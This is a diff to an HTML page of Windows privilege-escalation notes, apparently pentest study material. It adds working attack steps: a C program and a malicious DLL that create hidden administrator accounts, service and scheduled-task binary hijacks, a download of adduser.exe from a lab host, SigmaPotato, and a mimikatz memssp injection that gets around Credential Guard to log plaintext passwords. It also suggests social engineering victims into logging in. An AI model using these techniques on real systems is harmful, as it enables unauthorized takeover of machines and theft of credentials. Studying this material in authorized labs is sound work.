@@ -19,7 +19,7 @@
     <div id="navbar-container"></div>
 
     <div class="main-container">
-        <div class="sidebar" style="width: 400px;">
+        <div class="sidebar" style="width: 500px;">
             <h3>Quick content</h3>
             <ul id="sidebar-menu"></ul>
         </div>
@@ -66,7 +66,8 @@ Invoke-AllChecks</code></pre>
                         <pre><code class="language-powershell">tasklist /svc  #Show processes. It may help us to find a CVE for a specific software running in the host</code></pre>
                         <pre><code class="language-powershell">tree /F  #Show all files in the current folders in tree format</code></pre>
                         <pre><code class="language-powershell">gci C:\ -Recurse -Directory -ea 0 | % { $p="$($_.FullName)\t.txt"; try { ni $p -ItemType File -ea Stop | Out-Null; ri $p -Force; "[+] $($_.FullName)" } catch {} } #Show writeable folders</code></pre>
-                        
+                        <pre><code class="language-powershell">Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname    #32 bits applications</code></pre>
+                        <pre><code class="language-powershell">Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname     #64 bits applications</code></pre>
 
                     </ul>
 
@@ -122,6 +123,11 @@ Find-AllVulns</code></pre>
                     <ul>
                         <p> Equivalent for .bash_history </p>
                         <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+                        <p>Checking own History</p>
+                        <pre><code class="language-powershell">Get-History</code></pre>
+                        <p>Checking PSReadline which another history</p>
+                        <pre><code class="language-powershell">(Get-PSReadlineOption).HistorySavePath</code></pre>
+                        
                         <p> Check if there are users with autologon</p>
                         <pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon, DefaultUsername, DefaultDomainName, DefaultPassword</code></pre>
                     </ul>
@@ -136,6 +142,17 @@ Find-AllVulns</code></pre>
                         <ul>
                             <p>This privlege allow us to impersonate a client after authentication. Here we have several ways to exploit it</p>
                             <ul>
+                                <h4>SigmaPotato</h4>
+                                <ul>
+                                    <p>We can use SigmaPotato to escalate our privileges. Download it from <a class="notion-link" href="https://github.com/antonioCoco/SigmaPotato/releases">here</a>.</p>
+                                    <p>Once you have place it in the target machine just run</p>
+                                    <pre><code class="language-powershell">.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"</code></pre>
+
+                                    
+                                    
+                                </ul>
+
                                 <h4>PrintSpoofer</h4>
                                 <ul>
                                     <p>Can be run on WS 2016/2019 and W10 workstations</p>
@@ -526,19 +543,88 @@ sc config WindscribeService binpath="cmd.exe /c powershell.exe -ExecutionPolicy 
                          Service 'SecurityService' (State: Stopped, StartMode: Auto) : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
                     </ul>
 
+                    <h3>Scheduled tasks</h3>
+                    <ul>
+                        <p>First let's identify the scheduled tasks in the system</p>
+                        <pre><code class="language-powershell">schtasks /query /fo LIST /v   #cmd
+Get-ScheduledTask  #Powershell</code></pre>
+                        <p>In case you found that there is a lot of information displayed you could use the following command in powershell</p>
+                        <div class="button" onclick="toggleDiv()">Show content</div>
+                                 <div id="foldedDiv" class="content">
+                                 <pre><code class="language-powershell">Get-ScheduledTask | ForEach-Object {
+    $action = $_.Actions | Select-Object -First 1
+    [PSCustomObject]@{
+        Name   = $_.TaskName
+        Path   = $_.TaskPath
+        Action = $action.Execute
+        Args   = $action.Arguments
+        RunAs  = $_.Principal.UserId
+        State  = $_.State
+    }
+} | Where-Object { 
+    $_.Action -notlike "*\Windows\*" -and 
+    $_.Action -notlike "*\Microsoft*" -and
+    $_.Action -ne $null 
+} | Format-List</code></pre>  
+                                </div>
+                        
+                        <p>Now check the path of the executables and check if you have write permissions in any of them. Obviously look for an scheduled taks wich will be executed by a username which is admin.</p>
+                        <p>Now create the C exploit which will create a administrator user. <a href="#code" class="notion-link">here</a></p>
+                        <p>Compile it using the commands which are after the code and place the executable inside the target directory</p>
+                        <p>You can use the following command to transfer the file:</p>
+                        <pre><code class="language-powershell"></code>iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe</code></pre>
+                        <p>Wait for the task for being executed</p> 
+                    </ul>
+
+                    <h3>Hijacking binaries</h3>
+                    <ul>
+                        <p>In case we found a binary where we have full permissions over it we can escalate our privileges. First identify binaries which were previously installed by the user. Mostly all of them which are not present in <b>C:\Windows\system32</b></p>
+                        <pre><code class="language-cmd">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code></pre>
+                        <p><b>Instead of identifying binaries manually we can use powerup.ps1 tool <a class="notion-link" href="#">here</a></b></p>
+                        <p>Now check the permissions over the executable with icacls</p>
+                        <pre><code class="language-cmd">icacls "C:\xampp\apache\bin\httpd.exe"</code></pre>
+                        <p>The permissions we are looking for the are the following. <b>(F)</b> Full control or <b>(M)</b> Modify the .exe</p>
+                        <p>Now create a simple file in C to create a administrator user</p>
+                        <pre id="code"><code class="language-c">#include &lt;stdlib.h&gt;
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}</code></pre>
+                        <p>Compile the code </p>
+                        <pre><code class="language-bash">x86_64-w64-mingw32-gcc adduser.c -o adduser.exe  #64 bits
+i686-w64-mingw32-gcc -o Surveillance.exe  adduser.c -static #32 bits</code></pre>
+                        <p>Make a copy of the original binary</p>
+                        <pre><code class="language-cmd">move C:\xampp\mysql\bin\mysqld.exe mysqld.exe</code></pre>
+                        <p>Copy your malicious binary to the target location of the binary we would like to hijack</p>
+                        <pre><code class="language-cmd">move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe</code></pre> 
+                        <p>At this time we must restart the service. We could try with</p>
+                        <p>Have in mind that we first must check if the service we are targeting is in auto mode. This way whenever we perform the restart the service will start autoamtically</p>
+                        <pre><code class="language-cmd">Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}</code></pre>
+                        <p>Now that we know that the service es in auto we can stop and start it again</p>
+                        <pre><code class="language-cmd">net stop mysql</code></pre>
+                        <p>But in case we don't have permissions we should wait the user to do so or restar the whole server</p>
+                        <pre><code class="language-cmd">shutdown /r /t 0</code></pre>
+                    </ul>
+
                     <h3>Unquoted Service path</h3>
                     <ul>
-                        <p>When ever a windows service installs it saves the path in the Windows register. The problem appears when this path is saves without quotes</p>
+                        <p>Remeber to use powerup in order to identify vulnerable paths <a class="notion-link" href="#Automation">Here </a></p>
+                        <p>When ever a windows service installs it saves the path in the Windows register. The problem appears when this path is saved without quotes</p>
                         <pre><code class="language-cmd">"C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe"  ✅ (Right)
  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe    ⚠️ (vulnerable)</code></pre>
-                        <p>In those cases where quotes are not implace windows interprets paths in a strange way. It attempts to execute the binary trying the differents paths provided. Here is an example have as a base the previous unquoted path</p>
+                        <p>In those cases where quotes are not in place windows interprets paths in a strange way. It attempts to execute the binary trying the differents paths provided. Here is an example have as a based on the previous unquoted path</p>
                         <pre><code class="language-cmd">C:\Program.exe
 C:\Program Files.exe
 C:\Program Files (x86)\System.exe
 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></pre>
-                        <p>In case we would be able to write a file in any of this rotes with the specified name we could be able to perform a hijack</p>
+                        <p>In case we would be able to write a file in any of this routes with the specified name and we could be able to perform a hijack</p>
                         <p>Now let's search for those services with unquoted path. Use the following query</p>
-                        <pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>    
+                        <pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>    
                         <p>Once we identifyed the path we can use the following field to identify which could be the possible file locations to place our malicious .exe</p>
                         <div class="path-analyzer">
                             <input type="text" id="pathInput" placeholder="Ej: C:\Program Files\GVFS\GVFS.Service.exe" style="width:400px;">
@@ -547,11 +633,21 @@ C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code
                                 <textarea id="output" rows="10" cols="60" readonly></textarea>
                             </div>
                         </div>
-                    </ul>
+                        <p>Now check if you have permissions to write in any of the displayed locations. You can use icacls</p>                    
+                        <pre><code class="language-cmd">icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\Enterprise Apps"</code></pre>  
+                        <p>Look for a writeable locaitons (W)</p>
+                        <p>Now place the malicious file in the location you have found. You can use the previous code (C) in order to create an admin user</p>
+                        <p><b>IMPORTANT!</b> Remember that if whenever you restart the service windows returns you an error System error: "216 has occurred" Means that the binary you placed does not match the arquitecture of the service you are trying to exploit. In that case you need to recompilate the malicious binary to 32 bits or the corresponding arch</p>
+                        <pre><code class="language-cmd">copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'</code></pre>  
+                        <p>Finally, start or restart the service and wait for your executable of being executed</p>
+                        <pre><code class="language-cmd">Start-Service GammaService</code></pre>  
+                        </ul>
                     
                     <h3>Modifiable Registry Autorun Binary</h3>
                     <ul>
-                        <p>There are certain binaries which start when the OS starts we can check. We can check which are those binaries using the following command</p>
+                        <p>There are certain binaries which start when the OS starts. We can check which are those binaries using the following command</p>
                         <pre><code class="language-cmd">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl</code></pre>    
                         <p>Now we can check it's permissions and in case we have full control we can replace the binary with a malicious file. That way when an admin or other users login that binary will be executed</p> 
                         <pre><code class="language-cmd">icacls C:\Users\htb-student\AppData\Local\Microsoft\OneDrive\OneDrive.exe</code></pre>
@@ -874,6 +970,12 @@ mimikatz # sekurlsa::credman  </code></pre>
                             <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
                             <pre><code class="language-powershell">.\RunasCs.exe USER PASS powershell.exe -r 10.10.14.91:8000</code></pre>
                         </ul>
+
+                        <h3>Built-in option</h3>
+                        <ul>
+                            <p>We can also run runas from the Windows terminal since it comes preinstalled. But in this case we must have access to the GUI since the password prompt will be required</p>
+                            <pre><code class="language-powershell">runas /user:backupadmin cmd</code></pre>
+                        </ul>
                     </ul>
 
                     <h2 id="Extracting SAM">Extracting SAM</h2>
@@ -890,6 +992,8 @@ reg.exe save hklm\security C:\security.save</code></pre>
                             <p>First I recommend you to create a log file since some times you can't scroll</p>
                             <pre><code class="language-powershell">mimikatz # log C:\log.txt
 mimikatz # lsadump::sam</code></pre>
+                            <p>In case you found that you need some privileges we can escalte them by using. This will enable the privilege <b>SeDebugPrivilege</b></p>
+                            <pre><code class="language-powershell">mimikatz # token::elevate</code></pre>        
                         </ul>
                         <h3>From Linux</h3>
                         <ul>
@@ -942,7 +1046,30 @@ sekurlsa::logonpasswords</code></pre>
                         <ul>
                             <pre><code class="language-powershell">pypykatz lsa minidump file.dmp</code></pre>
                             <p>In case it shows any format error it is because the way you extracted did not work. Try using procdump, or rundll32 . <b>Extracting through task manager normally fails</b></p>
-                        </ul>    
+                        </ul>
+                        
+                        <h3>Avoiding security controls</h3>
+                        <ul>
+                            <p>In some cases you'll find that Windows Credential Guard is active. So in that case you won't be able to extract credentials from lsass.exe. Here you can find all the details about it and how to bypass it</p>
+                            <div class="button" onclick="toggleDiv()">Show content</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>First a little bit of theory. <b>What a SSP is?</b> It is a windows component that provides authentication services for the operating system. It is part of the architecture SSPI which allows different applications or windows servidces to authenticate</p>
+                                    <p>There are many legit SSP some of them are: Kerberos, NTLM, Negotiate, CredSSP... Every time a user logs in Windows LSSAS uses the corresponding SSP and process the authentication</p>
+                                    <p>In order to take advantage of it maliciously we can create a malicious SSP which is basically a malicious DLL that way we could be able to capture the user credentials during the authentication process</p>   
+                                    <h4>How to exploit it</h4>
+                                    <ul>
+                                        <p>First check if Windows Credential Guard is enabled</p>
+                                        <pre><code class="language-powershell">Get-ComputerInfo</code></pre>
+                                        <p>In case is active we won't be able to extract credentials using the traditional method</p>
+                                        <p>Create a malicious SSP using mimikatz</p>
+                                        <pre><code class="language-powershell">mimikatz # privilege::debug
+mimikatz # misc::memssp</code></pre>
+                                        <p>At this point we have two options, we can either be pation and wait for another user to remotely connecti to the machine or we can coerce the user to login via Social Engineering attack</p>
+                                        <p>Finally just check the following log <b>type C:\Windows\System32\mimilsa.log</b> and look for the credential in plain text</p>    
+                                    </ul>
+                                
+                                </div> 
+                        </ul>
                     </ul>
 
                     
@@ -1047,8 +1174,8 @@ Bypass-UAC -Method UacMethodSysprep</code></pre>
                     <ul>
                         <p>First use mimikatz to obtain the aes256_hmac</p>
                         <pre><code class="language-powershell"> .\mimikatz.exe
-                          mimikatz # privilege::debug
-                          mimikatz # sekurlsa::ekeys</code></pre>
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys</code></pre>
                         <p>Then akquire the aes256_hmac</p>
                         <pre><code class="language-powershell">aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc</code></pre>
                         <p>Then use rubeus.exe combined with the aes256_hmac you found</p>
@@ -1110,6 +1237,44 @@ Bypass-UAC -Method UacMethodSysprep</code></pre>
                         <p>It is always a useful to look for software which is not default in windows installation. This way you could be able find exploits to leverage your privileges. You can check which software is installed using</p>
                         <pre><code class="language-cmd">wmic product get name</code></pre>
                     </ul>
+
+                    <h2 id="Installed software">DLL Hijacking</h2>
+                    <ul>
+                        <p>Now that you have listed previously the installed software you could beggin searching for vulnerabilties that may lead to DLL hijacking. In order to exemplify a single case we will focus on a vulnerabiltity that affects FileZilla 3.63.1</p>
+                        <p>First identify the path of the executable and check if you are able to write files inside the folder</p>
+                        <pre><code class="language-cmd">echo 'test'  > C:\Filezilla\Filezilla FTP Client\test.txt</code></pre>
+                        <p>Now, it is recommended to use procmon in order to investigate how the DLLs are being loaded and where we could inject our own malicious DLL</p>
+                        <p>Here you can see some of the filters we can use</p>
+                        <img src="https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/96d3cc822281c7d597412e0b78698a2f-privesc_svcdll_dllsearch.png">
+                        <p>Now create our malicious DLL. <b>Remember that the name of the DLL must be the same as the one which will be impersonated. In this case TextShaping.cpp</b></p>
+                        <pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}</code></pre>
+                    <p>Compile it</p>
+                    <pre><code class="language-powerhshell">x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll</code></pre>
+                    <p>Transfer it... and wait for an administrator to run the application</p>
+                </ul>
                 
                     <h2 id="Escaping restricted environments">Escaping restricted environments</h2>
                     <ul>    
